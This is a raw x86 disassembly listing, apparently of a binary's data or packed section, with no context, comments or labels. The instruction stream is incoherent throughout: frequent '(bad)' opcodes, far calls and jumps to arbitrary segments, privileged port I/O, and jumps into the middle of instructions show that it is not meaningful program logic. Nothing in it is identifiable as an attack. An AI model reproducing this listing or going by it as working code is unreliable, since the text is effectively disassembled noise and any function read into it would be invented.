  408825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408826:	not    BYTE PTR [edi+edx*2]
  408829:	leave  
  40882a:	(bad)  
  40882b:	xor    ah,cl
  40882d:	adc    al,BYTE PTR [esi]
  40882f:	ret    
  408830:	jg     0x4088a4
  408832:	inc    ecx
  408833:	(bad)  
  408834:	vmaxps xmm1,xmm4,xmm4
  408838:	lods   al,BYTE PTR ds:[esi]
  408839:	out    0x9b,al
  40883b:	dec    BYTE PTR [eax+0x1cafeed4]
  408841:	das    
  408842:	retf   
  408843:	jae    0x4088ab
  408845:	sar    bh,1
  408847:	or     DWORD PTR [eax-0x4d],eax
  40884a:	imul   esi,DWORD PTR [edi],0xffffffec
  40884d:	inc    esp
  40884e:	hlt    
  40884f:	icebp  
  408850:	call   0x3aea:0x48b37659
  408857:	cmp    BYTE PTR [ebp-0x40b0846a],bl
  40885d:	out    0x64,eax
  40885f:	sbb    DWORD PTR [ebp+0x777383f3],ecx
  408865:	and    ecx,edx
  408867:	call   0x9fcf:0x36d8b537
  40886e:	(bad)  
  40886f:	int3   
  408870:	adc    eax,0xf1a6a13f
  408875:	sbb    ah,BYTE PTR [eax+ebp*2+0x3f]
  408879:	(bad)  
  40887a:	jmp    0x774:0x6ecff8cd
  408881:	add    ecx,DWORD PTR [edx-0x4a3f7276]
  408887:	test   eax,0xae874118
  40888c:	push   ebx
  40888d:	xor    BYTE PTR [ecx+eax*2],ah
  408890:	cdq    
  408891:	out    dx,eax
  408892:	mul    DWORD PTR [ebx+0x64]
  408895:	fsubr  st(6),st
  408897:	sub    eax,esi
  408899:	fdiv   DWORD PTR [ecx]
  40889b:	pop    ecx
  40889c:	loope  0x4088cd
  40889e:	test   eax,0x8281016
  4088a3:	rcr    DWORD PTR [esi],cl
  4088a5:	dec    ebx
  4088a6:	sbb    al,0x0
  4088a8:	cmp    dh,al
  4088aa:	in     eax,dx
  4088ab:	add    eax,0x4f6b3d1b
  4088b0:	repz mov eax,0xc16938a8
  4088b6:	sbb    ebp,edx
  4088b8:	int    0xb7
  4088ba:	imul   edi,ecx,0xffffff80
  4088bd:	loopne 0x408846
  4088bf:	lea    eax,[ebx-0x261f23cd]
  4088c5:	sub    ecx,esi
  4088c7:	cld    
  4088c8:	sbb    bh,BYTE PTR [esi+0x11]
  4088cb:	in     al,dx
  4088cc:	push   0x62
  4088ce:	jae    0x408915
  4088d0:	jno    0x408928
  4088d2:	jp     0x4088b8
  4088d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088d5:	mov    ah,0xb7
  4088d7:	inc    esp
  4088d8:	adc    eax,0xc9b9ac0
  4088dd:	mov    bl,0x11
  4088df:	push   edx
  4088e0:	(bad)  
  4088e1:	lds    esi,FWORD PTR [esi-0x683da29b]
  4088e7:	js     0x40887d
  4088e9:	adc    al,0xac
  4088eb:	push   esp
  4088ec:	fimul  WORD PTR [esi+0x45]
  4088ef:	mov    al,0xd3
  4088f1:	jmp    0xa997:0x4d7d3a8a
  4088f8:	clc    
  4088f9:	sbb    BYTE PTR [ebp+0x32],bh
  4088fc:	jle    0x4088a0
  4088fe:	ror    BYTE PTR [edx+0xdb86ead],cl
  408904:	or     al,0x16
  408906:	mov    ebp,0xa399610f
  40890b:	(bad)  
  40890c:	push   0xeee80802
  408911:	mov    bh,0x79
  408913:	jne    0x40898d
  408915:	sti    
  408916:	mov    ebp,0xbff4f32a
  40891b:	retf   0xfcbd
  40891e:	shl    DWORD PTR [edx-0x39491429],0xe0
  408925:	nop
  408926:	js     0x40892a
  408928:	push   ebp
  408929:	enter  0x306c,0x2b
  40892d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40892e:	fs add al,0x69
  408931:	mov    al,ds:0xea1ced41
  408936:	mov    al,0x67
  408938:	into   
  408939:	fistp  WORD PTR cs:[eax-0x4a]
  40893d:	jo     0x408930
  40893f:	(bad)  
  408940:	pop    esp
  408941:	add    DWORD PTR [eax],0xe21f5487
  408947:	ret    
  408948:	or     eax,DWORD PTR [ecx]
  40894a:	(bad)  
  40894b:	loop   0x4089b1
  40894d:	mov    ah,0xa
  40894f:	push   esp
  408950:	(bad)  
  408951:	mov    gs,WORD PTR [edi]
  408953:	out    0x91,eax
  408955:	fs (bad) 
  408957:	add    DWORD PTR [eax+0x88ec94c],edx
  40895d:	xchg   ebp,eax
  40895e:	pop    ds
  40895f:	xchg   al,ah
  408961:	mov    ah,0xe7
  408963:	sub    eax,0x2cdde121
  408968:	fdiv   DWORD PTR [ebx-0x65]
  40896b:	inc    ebx
  40896c:	rol    BYTE PTR [ecx+0x54],cl
  40896f:	stos   BYTE PTR es:[edi],al
  408970:	loop   0x408940
  408972:	call   0x85ee:0x5127052
  408979:	pop    ecx
  40897a:	shr    ecx,1
  40897c:	sub    edx,DWORD PTR [edx-0x3d07ca0d]
  408982:	jmp    0x3281:0x153e12db
  408989:	adc    cl,BYTE PTR [esi]
  40898b:	push   ebp
  40898c:	sti    
  40898d:	stc    
  40898e:	xchg   esp,eax
  40898f:	clc    
  408990:	cld    
  408991:	ins    DWORD PTR es:[edi],dx
  408992:	adc    al,0xea
  408994:	xchg   BYTE PTR [eax],cl
  408996:	retf   0x2345
  408999:	imul   esp,DWORD PTR [ebx],0xffffff9d
  40899c:	popa   
  40899d:	leave  
  40899e:	cmp    al,0xe3
  4089a0:	(bad)  
  4089a1:	jb     0x408a1e
  4089a3:	ret    
  4089a4:	stos   BYTE PTR es:[edi],al
  4089a5:	out    dx,al
  4089a6:	mov    cl,0x88
  4089a8:	push   esp
  4089a9:	add    eax,0x4705c3b7
  4089ae:	xor    eax,0x4045d535
  4089b3:	neg    ecx
  4089b5:	adc    edi,DWORD PTR cs:[esi+eax*2+0x75]
  4089ba:	leave  
  4089bb:	sbb    cl,BYTE PTR [ecx]
  4089bd:	shl    BYTE PTR [esi],cl
  4089bf:	mov    edi,0xd5c87491
  4089c4:	sbb    DWORD PTR [ecx],0x4d
  4089c7:	mov    WORD PTR [esi+0x1d],fs
  4089ca:	(bad)  [eax]
  4089cc:	push   ss
  4089cd:	ftst   
  4089cf:	push   edx
  4089d0:	inc    ebx
  4089d1:	aas    
  4089d2:	add    eax,0xf874844
  4089d7:	pop    es
  4089d8:	mov    ch,0xf0
  4089da:	jmp    0x408972
  4089dc:	pminub mm2,mm1
  4089df:	fwait
  4089e0:	icebp  
  4089e1:	jg     0x408968
  4089e3:	dec    esp
  4089e4:	faddp  st(1),st
  4089e6:	push   0x3a
  4089e8:	sbb    ebx,DWORD PTR [edx-0x44c40e36]
  4089ee:	cli    
  4089ef:	loopne 0x408993
  4089f1:	xor    ch,BYTE PTR [ebp-0x24]
  4089f4:	inc    ecx
  4089f5:	sbb    al,0xcd
  4089f7:	dec    ebx
  4089f8:	ret    0xb2be
  4089fb:	pop    ecx
  4089fc:	push   eax
  4089fd:	neg    ecx
  4089ff:	or     al,0xb8
  408a01:	mov    esi,0xd322fc5a
  408a06:	push   edi
  408a07:	mov    dl,0x24
  408a09:	out    dx,al
  408a0a:	ja     0x408a8a
  408a0c:	call   DWORD PTR [eax]
  408a0e:	sub    esp,DWORD PTR [esi-0x7]
  408a11:	test   eax,0xe55d2016
  408a16:	inc    edi
  408a17:	xor    eax,0xe4d79b3f
  408a1c:	sbb    edx,DWORD PTR [ebx+ebx*2-0x30]
  408a20:	dec    eax
  408a21:	jae    0x4089ca
  408a23:	stos   BYTE PTR es:[edi],al
  408a24:	test   al,0x40
  408a26:	sub    ebp,ebp
  408a28:	sub    edi,0xfffffffb
  408a2b:	test   BYTE PTR [ebp+edx*2-0x50],dl
  408a2f:	jge    0x4089d3
  408a31:	mov    DWORD PTR [esi-0x1f],ebp
  408a34:	out    dx,al
  408a35:	out    0x2a,eax
  408a37:	mov    dh,0x4f
  408a39:	sti    
  408a3a:	das    
  408a3b:	mov    cl,0x38
  408a3d:	jmp    0xb654:0x44d4a651
  408a44:	add    cl,BYTE PTR [eax]
  408a46:	sbb    eax,0xfc147129
  408a4b:	pop    es
  408a4c:	adc    al,0xa4
  408a4e:	xor    DWORD PTR [edx+0x6f],ecx
  408a51:	dec    esp
  408a52:	dec    edi
  408a53:	(bad)  
  408a54:	dec    ebx
  408a55:	and    edx,edx
  408a57:	or     DWORD PTR [eax+0xa814a03],ebx
  408a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5e:	pop    esi
  408a5f:	mov    al,ds:0x57ef9c90
  408a64:	sub    edi,DWORD PTR [edx-0x61062a7c]
  408a6a:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  408a6c:	inc    ecx
  408a6d:	inc    edi
  408a6e:	mov    al,ds:0xf5ed4168
  408a73:	pop    es
  408a74:	inc    ebx
  408a75:	inc    esp
  408a76:	sub    al,0x2e
  408a78:	xor    ebx,DWORD PTR [edx-0x35]
  408a7b:	adc    al,0x21
  408a7d:	js     0x408a65
  408a7f:	or     BYTE PTR [edi-0x67eade1f],ah
  408a85:	sub    eax,0x58531704
  408a8a:	in     al,0x54
  408a8c:	push   0xffffffcc
  408a8e:	es jb  0x408a95
  408a91:	adc    esi,DWORD PTR [eax+0x20c72806]
  408a97:	ins    BYTE PTR es:[edi],dx
  408a98:	add    eax,0x21206c70
  408a9d:	cmp    DWORD PTR [ebx+edx*2],ecx
  408aa0:	cmp    dh,bh
  408aa2:	xchg   ebx,eax
  408aa3:	add    BYTE PTR [ecx+0x4fa98fbe],al
  408aa9:	call   0xcef0:0xaaaffcc0
  408ab0:	imul   eax,DWORD PTR ds:0x2c031656,0x4b
  408ab7:	pop    ecx
  408ab8:	popa   
  408ab9:	and    eax,0xe1ecccf3
  408abe:	mov    ah,0xd2
  408ac0:	outs   dx,DWORD PTR ds:[esi]
  408ac1:	sub    ebx,DWORD PTR [edx]
  408ac3:	adc    BYTE PTR [ebp+0x77726e0e],ch
  408ac9:	mov    DWORD PTR [eax],ecx
  408acb:	pop    esp
  408acc:	sub    BYTE PTR [ebx],0x4e
  408acf:	lds    ecx,FWORD PTR [edx-0x5f]
  408ad2:	xchg   DWORD PTR [eax-0x45c00e91],ecx
  408ad8:	or     BYTE PTR ds:0x2f911b9d,ah
  408ade:	adc    BYTE PTR [esi+0x79785110],bl
  408ae4:	ins    DWORD PTR es:[edi],dx
  408ae5:	jmp    0x6303:0x9710aad2
  408aec:	ret    
  408aed:	cdq    
  408aee:	inc    esi
  408aef:	mov    ah,0x3b
  408af1:	inc    esp
  408af2:	or     bl,BYTE PTR [edi+ecx*4]
  408af5:	mov    cl,0xda
  408af7:	shl    BYTE PTR [ecx-0x45],cl
  408afa:	mov    cs,WORD PTR [edi-0x7]
  408afd:	lods   al,BYTE PTR ds:[esi]
  408afe:	xor    BYTE PTR [edx],al
  408b00:	adc    ch,BYTE PTR ds:[eax+edx*8-0x1d7d5c0d]
  408b08:	test   eax,0xafac60dd
  408b0d:	into   
  408b0e:	cmp    eax,0x5a2e84db
  408b13:	pop    esi
  408b14:	mov    ds:0xecafd0b,eax
  408b19:	pop    edi
  408b1a:	or     DWORD PTR [edx-0xd02252],ebx
  408b20:	inc    esi
  408b21:	dec    ecx
  408b22:	jl     0x408b1f
  408b24:	add    eax,0x93fe01ae
  408b29:	int3   
  408b2a:	adc    DWORD PTR [ebp-0x5f],esp
  408b2d:	adc    al,0xc6
  408b2f:	dec    esp
  408b30:	out    dx,al
  408b31:	rcr    DWORD PTR [ebx+eax*4],0x55
  408b35:	adc    al,0x90
  408b37:	xor    bl,BYTE PTR [edx+0x13]
  408b3a:	test   al,0xc8
  408b3c:	shl    DWORD PTR [ebx+ebx*4+0x3cde6b12],1
  408b43:	jecxz  0x408b3a
  408b45:	test   eax,0x7dc5d0e0
  408b4a:	out    dx,eax
  408b4b:	jp     0x408b4b
  408b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b4f:	xabort 0x12
  408b52:	jge    0x408af8
  408b54:	bound  ebx,QWORD PTR [ebx+0x62]
  408b57:	aam    0xc6
  408b59:	inc    ebp
  408b5a:	pop    ebp
  408b5b:	push   edi
  408b5c:	(bad)  
  408b5d:	icebp  
  408b5e:	jnp    0x408b1e
  408b60:	and    al,0x9c
  408b62:	mov    BYTE PTR [esi+ebp*8+0x240a3b7b],0x94
  408b6a:	cmp    BYTE PTR [edx+0x29],ah
  408b6d:	int3   
  408b6e:	add    BYTE PTR [esi],0xc7
  408b71:	dec    ebx
  408b72:	call   0xe2900b40
  408b77:	mov    ecx,0xa678b2a6
  408b7c:	inc    ebp
  408b7d:	jmp    0x210c7b09
  408b82:	hlt    
  408b83:	outs   dx,DWORD PTR ds:[esi]
  408b84:	pop    ebx
  408b85:	(bad)  
  408b86:	mov    esp,0x7520c1f2
  408b8b:	(bad)  [ebx-0x7cdec4e0]
  408b91:	leave  
  408b92:	jbe    0x408bce
  408b94:	inc    ecx
  408b95:	inc    ebx
  408b96:	sti    
  408b97:	push   esi
  408b98:	cmc    
  408b99:	test   eax,0xf145ad44
  408b9e:	and    eax,0x3de72ca6
  408ba3:	xchg   ebp,eax
  408ba4:	outs   dx,DWORD PTR ds:[esi]
  408ba5:	xchg   ebp,eax
  408ba6:	dec    esi
  408ba7:	dec    edx
  408ba8:	and    bl,bl
  408baa:	mov    edi,0xb9da1ee5
  408baf:	or     DWORD PTR [ebx-0x64],esi
  408bb2:	jo     0x408bd7
  408bb4:	ja     0x408c0e
  408bb6:	add    eax,0x172beacf
  408bbb:	sbb    esi,DWORD PTR [ebx+0xc]
  408bbe:	add    bl,BYTE PTR [esi+esi*1+0x3]
  408bc2:	ja     0x408c02
  408bc4:	adc    dl,ah
  408bc6:	ret    
  408bc7:	outs   dx,DWORD PTR ds:[esi]
  408bc8:	pop    ecx
  408bc9:	aad    0xdf
  408bcb:	arpl   di,si
  408bcd:	popf   
  408bce:	xor    al,0xe8
  408bd0:	fadd   st(4),st
  408bd2:	dec    ecx
  408bd3:	xor    bh,BYTE PTR [ebx]
  408bd5:	mov    cl,BYTE PTR [ebx-0x31]
  408bd8:	pop    edx
  408bd9:	mov    al,0x14
  408bdb:	ror    DWORD PTR [ebx-0x687b586f],cl
  408be1:	lods   al,BYTE PTR ds:[esi]
  408be2:	xor    al,0x65
  408be4:	mov    ah,0xa4
  408be6:	xor    al,0x6c
  408be8:	test   eax,0xcff39b7
  408bed:	ret    
  408bee:	or     esp,ebx
  408bf0:	push   0x73
  408bf2:	out    0xc,al
  408bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bf5:	(bad)  
  408bf6:	neg    eax
  408bf8:	ror    BYTE PTR [esi-0x12e1e5d5],cl
  408bfe:	fcomip st,st(2)
  408c00:	xchg   ecx,eax
  408c01:	or     eax,0x7a1cd917
  408c06:	fs or  esp,0x955f2ef5
  408c0d:	xor    DWORD PTR [ecx],eax
  408c0f:	pop    es
  408c10:	sub    DWORD PTR [esi+0x7246ee11],esi
  408c16:	aad    0xde
  408c18:	pusha  
  408c19:	ja     0x408c4a
  408c1b:	inc    ecx
  408c1c:	ret    0xc940
  408c1f:	mov    ch,BYTE PTR [ebp-0x22a671df]
  408c25:	jno    0x408c62
  408c27:	mov    ecx,DWORD PTR [ebx+0xe]
  408c2a:	mov    dl,0xd
  408c2c:	push   ebx
  408c2d:	or     DWORD PTR [edi-0x63ce6430],0xffffff87
  408c34:	sbb    DWORD PTR [edi-0x7b],0x3c854ee8
  408c3b:	mov    edi,cs
  408c3d:	inc    esi
  408c3e:	js     0x408c18
  408c40:	adc    eax,0x59fbbeac
  408c45:	inc    edi
  408c46:	pop    ebp
  408c47:	inc    esp
  408c48:	cld    
  408c49:	fsubr  QWORD PTR [eax*8-0x7c0aa5e7]
  408c50:	and    al,BYTE PTR [eax+0x5bb52421]
  408c56:	dec    ebx
  408c57:	mov    bh,0xa3
  408c59:	lods   eax,DWORD PTR ds:[esi]
  408c5a:	pusha  
  408c5b:	shl    BYTE PTR [esi-0xf],1
  408c5e:	nop
  408c5f:	nop
  408c60:	push   eax
  408c61:	popa   
  408c62:	mov    bl,0x9
  408c64:	push   edi
  408c65:	jne    0x408c6c
  408c67:	pop    ebx
  408c68:	or     eax,0x3b452263
  408c6d:	js     0x408c87
  408c6f:	or     dh,ch
  408c71:	into   
  408c72:	leave  
  408c73:	std    
  408c74:	jb     0x408c3a
  408c76:	adc    eax,0xa4585478
  408c7b:	test   dh,al
  408c7d:	jg     0x408c91
  408c7f:	add    DWORD PTR [ebp+0x2eda9d41],esi
  408c85:	add    eax,0x120151b0
  408c8a:	sub    BYTE PTR [bx+si+0x1c48],bh
  408c8f:	mov    eax,0x3dd9bd2d
  408c94:	outs   dx,DWORD PTR ds:[esi]
  408c95:	adc    edx,DWORD PTR [ebx+0x6d]
  408c98:	jecxz  0x408cfe
  408c9a:	jo     0x408cc3
  408c9c:	cmc    
  408c9d:	ss cmp ah,al
  408ca0:	lahf   
  408ca1:	pop    eax
  408ca2:	dec    si
  408ca4:	in     al,dx
  408ca5:	xor    al,0xda
  408ca7:	cpuid  
  408ca9:	mov    edi,0x59d2ea40
  408cae:	push   edi
  408caf:	sahf   
  408cb0:	std    
  408cb1:	jae    0x408c58
  408cb3:	xchg   esi,eax
  408cb4:	outs   dx,DWORD PTR ds:[esi]
  408cb5:	xor    eax,0xa0a4e3e2
  408cba:	add    BYTE PTR [ebp-0xe],bh
  408cbd:	test   eax,0x5b0e5a78
  408cc2:	xchg   esi,eax
  408cc3:	adc    esi,DWORD PTR [esi+0x153e08c3]
  408cc9:	add    BYTE PTR [eax+edx*1],bh
  408ccc:	jp     0x408c99
  408cce:	jmp    0xb009:0xabcdb7cb
  408cd5:	dec    edx
  408cd6:	mov    dh,0xfe
  408cd8:	call   0x8493bf23
  408cdd:	pop    esi
  408cde:	jno    0x408c9f
  408ce0:	jb     0x408c85
  408ce2:	and    esi,edx
  408ce4:	das    
  408ce5:	sub    ebp,DWORD PTR [esi-0xd]
  408ce8:	dec    esp
  408ce9:	xchg   esi,eax
  408cea:	push   eax
  408ceb:	(bad)  
  408cec:	mov    al,0xd8
  408cee:	lods   al,BYTE PTR ds:[esi]
  408cef:	sub    ecx,DWORD PTR [esi]
  408cf1:	clc    
  408cf2:	or     al,BYTE PTR [esp+eax*1]
  408cf5:	inc    esp
  408cf6:	sti    
  408cf7:	adc    edx,DWORD PTR [ebp+0x79]
  408cfa:	cmp    DWORD PTR [eax],ebp
  408cfc:	xlat   BYTE PTR ds:[ebx]
  408cfd:	add    esp,DWORD PTR [ecx-0x4c]
  408d00:	popf   
  408d01:	sub    BYTE PTR cs:[eax+edx*1+0x6c14884b],dl
  408d09:	add    al,0x9f
  408d0b:	mul    dl
  408d0d:	push   ebx
  408d0e:	xor    DWORD PTR [ebx],ebp
  408d10:	xchg   ebx,eax
  408d11:	xchg   BYTE PTR [ebx],ah
  408d13:	cmp    edx,esp
  408d15:	mov    bl,0xf9
  408d17:	daa    
  408d18:	mov    cl,0x62
  408d1a:	leave  
  408d1b:	loop   0x408cfd
  408d1d:	in     eax,0x1a
  408d1f:	pcmpgtb mm1,QWORD PTR [ebx-0x15]
  408d23:	sub    ebx,DWORD PTR cs:[ecx+0x17]
  408d27:	pop    ds
  408d28:	xor    al,0xff
  408d2a:	call   0x31e80bfa
  408d2f:	xchg   dl,bl
  408d31:	cli    
  408d32:	inc    edi
  408d33:	xor    al,0x83
  408d35:	gs pop es
  408d37:	pop    edi
  408d38:	xchg   ebx,eax
  408d39:	retf   
  408d3a:	sub    cl,bl
  408d3c:	ficomp DWORD PTR [edx-0x7a]
  408d3f:	sbb    al,BYTE PTR [esi-0x5ce21d80]
  408d45:	jp     0x408d02
  408d47:	xor    esi,esi
  408d49:	rcr    eax,1
  408d4b:	push   ebx
  408d4c:	xor    BYTE PTR [ebp+0x6385007],ah
  408d52:	jne    0x408dab
  408d54:	fisttp WORD PTR [ebx+edi*4+0x24ea4bc1]
  408d5b:	repnz sub eax,DWORD PTR [ecx+0x11]
  408d5f:	sub    ebx,ebp
  408d61:	xchg   edi,eax
  408d62:	lahf   
  408d63:	enter  0xe12a,0xa3
  408d67:	and    eax,0x24618fb6
  408d6c:	ror    DWORD PTR [eax-0xa],1
  408d6f:	add    eax,0xb8c44c2
  408d74:	pop    ds
  408d75:	inc    ebx
  408d76:	add    ebx,DWORD PTR [esi+0x1c9a86ee]
  408d7c:	sahf   
  408d7d:	mov    ecx,0xf0ef7565
  408d82:	and    al,0xab
  408d84:	or     edx,DWORD PTR [edx+0x2f]
  408d87:	je     0x408dab
  408d89:	mov    ebp,DWORD PTR [ecx+0x22]
  408d8c:	loope  0x408de5
  408d8e:	cmp    al,0xa6
  408d90:	fist   DWORD PTR [ebp+0x5d]
  408d93:	pop    eax
  408d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d95:	pop    esi
  408d96:	inc    esp
  408d97:	loopne 0x408d5e
  408d99:	add    ebp,DWORD PTR [esi+0x17]
  408d9c:	mov    al,ds:0x13240f88
  408da1:	jge    0x408d7c
  408da3:	cli    
  408da4:	jns    0x408d7f
  408da6:	cli    
  408da7:	imul   ecx,DWORD PTR [edx-0x66],0xdbda4a63
  408dae:	pop    esp
  408daf:	inc    esi
  408db0:	xchg   bp,ax
  408db2:	or     ebp,esi
  408db4:	or     al,0x7
  408db6:	stos   BYTE PTR es:[edi],al
  408db7:	lea    ecx,[edi-0x17a041a]
  408dbd:	mov    bh,0x7d
  408dbf:	aaa    
  408dc0:	push   ss
  408dc1:	pop    es
  408dc2:	cli    
  408dc3:	mov    al,0x5
  408dc5:	mov    gs,WORD PTR [esi-0x31]
  408dc8:	cwde   
  408dc9:	or     al,0xa2
  408dcb:	mov    ecx,0x8d0f7c76
  408dd0:	mov    ds:0x1e73947f,al
  408dd5:	fadd   DWORD PTR [ebx-0x2eaa6dbb]
  408ddb:	mov    esi,0x55c361ec
  408de0:	cs mov al,gs:0xcee65e43
  408de7:	pusha  
  408de8:	fwait
  408de9:	loope  0x408dd7
  408deb:	xor    al,0x4c
  408ded:	retf   0x6635
  408df0:	pop    ebx
  408df1:	rcl    ch,0xb9
  408df4:	xchg   edx,eax
  408df5:	mov    al,ds:0x2b2f2644
  408dfa:	sti    
  408dfb:	jp     0x408e00
  408dfd:	sbb    BYTE PTR [ebx-0x1e],0xdf
  408e01:	adc    al,0x93
  408e03:	adc    esp,ebp
  408e05:	or     ah,BYTE PTR [eax+0x46]
  408e08:	push   eax
  408e09:	retf   
  408e0a:	cld    
  408e0b:	cmp    DWORD PTR [edi+0x33],ebx
  408e0e:	cmp    al,0xc0
  408e10:	mov    ecx,0x756fdf58
  408e15:	jns    0x408e4a
  408e17:	cmp    eax,0x3ffdd8ea
  408e1c:	jo     0x408e35
  408e1e:	pop    esi
  408e1f:	mov    ebp,0xe2ed63c4
  408e24:	out    0xe0,al
  408e26:	inc    esp
  408e27:	in     al,0xff
  408e29:	pop    edx
  408e2a:	inc    ebx
  408e2b:	sahf   
  408e2c:	push   ecx
  408e2d:	jne    0x408e05
  408e2f:	mov    gs,WORD PTR [eax-0xb]
  408e32:	xor    al,0xae
  408e34:	and    al,0x98
  408e36:	cmp    bh,BYTE PTR [eax-0x2]
  408e39:	shr    BYTE PTR [esi-0x2f557831],0xc6
  408e40:	jno    0x408dd0
  408e42:	sub    al,0x54
  408e44:	push   ss
  408e45:	shl    bl,0xe2
  408e48:	jp     0x408e09
  408e4a:	sti    
  408e4b:	neg    BYTE PTR [esi]
  408e4d:	jbe    0x408def
  408e4f:	(bad)  
  408e50:	imul   ebx,DWORD PTR [ebx-0x3ce13d67],0x3cf62b7c
  408e5a:	mov    ecx,0xf3057895
  408e5f:	push   esp
  408e60:	cmc    
  408e61:	dec    edi
  408e62:	shl    DWORD PTR [ecx],0x7
  408e65:	inc    esp
  408e66:	popa   
  408e67:	push   eax
  408e68:	sbb    BYTE PTR [edx],dh
  408e6a:	test   eax,0x223dd019
  408e6f:	or     ebx,DWORD PTR [edx]
  408e71:	push   ecx
  408e72:	imul   ecx,DWORD PTR [ebp+0x4a],0x4b
  408e76:	js     0x408ea9
  408e78:	test   eax,0x3376cfe3
  408e7d:	xor    eax,0xe86fe7a6
  408e82:	mov    edi,0x25fd0154
  408e87:	or     ebp,DWORD PTR [edi-0xd3727c3]
  408e8d:	sbb    al,0x96
  408e8f:	add    DWORD PTR [edx+0x49],0x2d411c2f
  408e96:	imul   ecx,DWORD PTR [edi+0x672a0355],0x32
  408e9d:	mov    eax,ds:0xe1c1a5a0
  408ea2:	ds mov ah,0x63
  408ea5:	xchg   DWORD PTR [ebx],esi
  408ea7:	fstp   DWORD PTR [esi+0x63f553ad]
  408ead:	dec    esp
  408eae:	jbe    0x408e42
  408eb0:	mov    dh,0xca
  408eb2:	imul   esi,DWORD PTR [ebx+eiz*2],0xd6f5c830
  408eb9:	adc    BYTE PTR [ebx-0x590c0a66],dl
  408ebf:	fsubr  DWORD PTR [eax+0x75985ec1]
  408ec5:	pop    es
  408ec6:	push   ds
  408ec7:	cmp    ebp,ebp
  408ec9:	xchg   DWORD PTR [esi+0x2c],edx
  408ecc:	sbb    eax,ebp
  408ece:	fnstsw WORD PTR [edi-0x1c]
  408ed1:	retf   
  408ed2:	fnstsw WORD PTR cs:[esi]
  408ed5:	sbb    BYTE PTR ds:0x7f916376,0xe3
  408edc:	sub    esi,ebp
  408ede:	(bad)  
  408ee0:	fistp  QWORD PTR [esi+edx*8-0x5b]
  408ee4:	rcr    DWORD PTR [eax-0x4e],cl
  408ee7:	mov    ds:0x181061f8,al
  408eec:	xchg   BYTE PTR [edi-0x69],bl
  408eef:	sub    BYTE PTR ds:0x41648341,dh
  408ef5:	xlat   BYTE PTR ds:[ebx]
  408ef6:	and    dh,BYTE PTR [esi]
  408ef8:	mov    al,0xce
  408efa:	mov    ebx,edi
  408efc:	adc    ebp,ebp
  408efe:	jmp    0x40773bcf
  408f03:	and    ebx,DWORD PTR [esi+0x7]
  408f06:	sti    
  408f07:	and    al,0x52
  408f09:	lods   al,BYTE PTR ds:[esi]
  408f0a:	shl    BYTE PTR [eax+0x7a3bf3c1],cl
  408f10:	(bad)  
  408f11:	pusha  
  408f12:	cwde   
  408f13:	or     DWORD PTR [ebx-0x35d47bca],esp
  408f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f1a:	aam    0x31
  408f1c:	daa    
  408f1d:	mov    bl,0xdc
  408f1f:	cmp    cl,dl
  408f21:	add    eax,0xc3356fd3
  408f26:	push   eax
  408f27:	pop    edi
  408f28:	dec    edi
  408f29:	xor    al,0x3c
  408f2b:	push   ecx
  408f2c:	push   ds
  408f2d:	mov    esi,0xe50c210a
  408f32:	fcomp  QWORD PTR [esi-0x2b7fbd7a]
  408f38:	mov    cl,BYTE PTR es:[ebx+0x65]
  408f3c:	mov    al,ds:0xd20b7db2
  408f41:	mov    bl,0xb
  408f43:	jns    0x408f1e
  408f45:	aaa    
  408f46:	out    dx,al
  408f47:	pop    ebp
  408f48:	adc    ebx,DWORD PTR [edi+0x73]
  408f4b:	sbb    eax,0x49070f3c
  408f50:	pop    esp
  408f51:	loop   0x408f5a
  408f53:	je     0x408f1b
  408f55:	mov    ebp,0xd8a0811e
  408f5a:	xor    eax,0x7a332f0e
  408f5f:	pop    edx
  408f60:	repnz loope 0x408fc7
  408f63:	pop    ebp
  408f64:	lock nop
  408f66:	xor    al,0xf0
  408f68:	ss inc edx
  408f6a:	add    DWORD PTR ds:0x15e38ae4,edx
  408f70:	stc    
  408f71:	icebp  
  408f72:	aaa    
  408f73:	push   esp
  408f74:	push   cs
  408f75:	ret    
  408f76:	push   eax
  408f77:	xchg   ebx,eax
  408f78:	fwait
  408f79:	ret    
  408f7a:	fwait
  408f7b:	pushf  
  408f7c:	cmp    al,0xf3
  408f7e:	sbb    BYTE PTR [ebx],cl
  408f80:	loopne 0x408f2f
  408f82:	inc    eax
  408f83:	test   eax,0xe3931f34
  408f88:	(bad)  
  408f89:	mov    DWORD PTR [esi+0x472788e8],ebx
  408f8f:	mov    ds:0x2c37ec61,al
  408f94:	mov    cl,0xfd
  408f96:	adc    al,0x33
  408f98:	aad    0xc5
  408f9a:	mov    esp,0x448e6521
  408f9f:	sbb    BYTE PTR [ebx],bh
  408fa1:	mov    edx,0x4e54c623
  408fa6:	sbb    al,0x45
  408fa8:	and    ah,BYTE PTR [esp+edi*4+0x6d8a242b]
  408faf:	push   edx
  408fb0:	lds    eax,FWORD PTR [ecx-0x7d]
  408fb3:	aaa    
  408fb4:	loop   0x408f84
  408fb6:	add    ebx,ebp
  408fb8:	mov    ds:0xa6d94410,eax
  408fbd:	mov    esp,0x8acfcbe5
  408fc2:	bound  edi,QWORD PTR [ecx]
  408fc4:	dec    esi
  408fc5:	add    esi,ebp
  408fc7:	jb     0x408f8d
  408fc9:	jg     0x408fad
  408fcb:	fnsave [edi-0x4c]
  408fce:	and    eax,0x47f6522c
  408fd3:	add    eax,0x8b9c3
  408fd8:	mov    fs,WORD PTR [edi-0x39]
  408fdb:	aas    
  408fdc:	mov    esp,0x1efce15e
  408fe1:	jo     0x408f91
  408fe3:	push   ds
  408fe4:	pop    ebp
  408fe5:	sub    al,0x1d
  408fe7:	jecxz  0x408f9a
  408fe9:	xchg   BYTE PTR [esi],bh
  408feb:	test   eax,0x7e77323d
  408ff0:	mov    eax,ds:0x5d214acc
  408ff5:	or     ch,dl
  408ff7:	(bad)  
  408ff8:	jmp    0x40905e
  408ffa:	fcom   DWORD PTR [edx+0x17db73b0]
  409000:	xchg   edi,eax
  409001:	jp     0x408f9b
